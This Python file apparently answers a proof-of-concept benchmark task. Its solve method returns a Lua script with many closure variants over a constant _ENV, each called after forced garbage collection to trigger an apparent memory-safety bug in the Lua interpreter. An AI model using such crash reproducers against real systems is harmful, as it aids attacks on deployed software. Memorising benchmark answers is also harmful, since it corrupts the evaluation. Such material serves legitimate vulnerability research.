import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = """
local function safe(f)
  local ok, err = pcall(f)
end

safe(function()
  local function make()
    local _ENV <const> = setmetatable({}, { __index = _G })
    return function()
      return tostring(x)
    end
  end
  local f = make()
  for _=1,10 do collectgarbage() end
  f()
end)

safe(function()
  local f = (function()
    local _ENV <const> = setmetatable({}, { __index = _G })
    return function()
      return tostring(x)
    end
  end)()
  for _=1,10 do collectgarbage() end
  f()
end)

safe(function()
  local function make()
    local _ENV <const> = setmetatable({}, { __index = _G })
    local function g()
      return tostring(x)
    end
    return function()
      return g()
    end
  end
  local f = make()
  for _=1,10 do collectgarbage() end
  f()
end)

safe(function()
  local loader = load([[
    local function make()
      local _ENV <const> = setmetatable({}, { __index = _G })
      return function() return tostring(x) end
    end
    return make()
  ]])
  local f = loader()
  for _=1,10 do collectgarbage() end
  f()
end)

safe(function()
  local function make()
    local _ENV <const> = setmetatable({}, { __index = _G })
    local co = coroutine.create(function() return tostring(x) end)
    return function()
      local ok, v = coroutine.resume(co)
      return v
    end
  end
  local f = make()
  for _=1,10 do collectgarbage() end
  f()
end)

safe(function()
  local function make()
    local _ENV <const> = setmetatable({}, { __index = _G })
    local function h(a, ...)
      return tostring(x), select("#", ...), a
    end
    return function(...)
      return h(...)
    end
  end
  local f = make()
  for _=1,10 do collectgarbage() end
  f(1,2,3,4)
end)

safe(function()
  local function make()
    local _ENV <const> = setmetatable({}, { __index = _G })
    local t = {}
    for i=1,50 do
      t[i] = function() return tostring(x) end
    end
    return t[25]
  end
  local f = make()
  for _=1,10 do collectgarbage() end
  f()
end)

safe(function()
  local function make()
    local _ENV <const> = setmetatable({}, { __index = _G })
    local function deep1()
      local function deep2()
        local function deep3()
          return tostring(x)
        end
        return deep3()
      end
      return deep2()
    end
    return function() return deep1() end
  end
  local f = make()
  for _=1,10 do collectgarbage() end
  f()
end)

safe(function()
  local function make()
    local _ENV <const> = setmetatable({}, { __index = _G })
    local function wrap(fn)
      return function(...) return fn(...) end
    end
    return wrap(function() return tostring(x) end)
  end
  local f = make()
  for _=1,10 do collectgarbage() end
  f()
end)

safe(function()
  local function make()
    local _ENV <const> = setmetatable({}, { __index = _G })
    local u = {}
    setmetatable(u, { __mode = "v" })
    u[1] = function() return tostring(x) end
    return u[1]
  end
  local f = make()
  for _=1,10 do collectgarbage() end
  f()
end)
"""
        return poc.encode("utf-8")